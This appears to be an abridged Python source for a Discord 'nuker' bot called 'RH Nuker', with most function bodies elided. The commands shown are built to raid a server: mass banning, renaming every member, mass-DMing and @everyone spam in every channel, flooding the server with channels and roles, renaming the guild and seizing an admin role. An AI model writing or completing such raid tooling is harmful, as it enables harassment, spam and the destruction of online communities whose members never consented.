...
@commands.check(isWhitelisted)
async def nuke(ctx, ban: bool = True, text: str = "RH Nuker"):
    await msg_delete(ctx)
...
@commands.check(isWhitelisted)
async def renameEveryone(ctx, *, name="RH Nuker"):
    await msg_delete(ctx)
    for m in ctx.guild.members:
        if m.id not in owners:
            try:
...
@commands.check(isWhitelisted)
async def dmEveryone(ctx, *, msg="RH Nuker"):
    await msg_delete(ctx)
    for m in ctx.guild.members:
        if m.id not in owners:
            try:
...
@commands.check(isWhitelisted)
async def spamToAllChannels(ctx, amount: int = 50, *, text="@everyone RH Nuker"):
    await msg_delete(ctx)
...
@commands.check(isWhitelisted)
async def spamToCurrentChannel(ctx, amount: int = 50, *, text="@everyone RH Nuker"):
    await msg_delete(ctx)
    for i in range(amount):
        try:
...
@commands.check(isWhitelisted)
async def spamWithChannels(ctx, amount: int = 25, *, name="RH Nuker"):
    await msg_delete(ctx)
    for i in range(amount):
        try:
...
@commands.check(isWhitelisted)
async def spamWithRoles(ctx, amount: int = 25, *, name="RH Nuker"):
    await msg_delete(ctx)
    for i in range(amount):
        try:
...
@commands.check(isWhitelisted)
async def editServerName(ctx, *, name="RH Nuker"):
    await msg_delete(ctx)
    try:
...
@commands.check(isWhitelisted)
async def getAdmin(ctx, *, rolename="RH Nuker"):
    await msg_delete(ctx)
    try:
...
async def reviveGuild(ctx, guildId: int = None):
    if guildId:
        ...
        try:
            await guild.create_text_channel(name="RH Nuker")
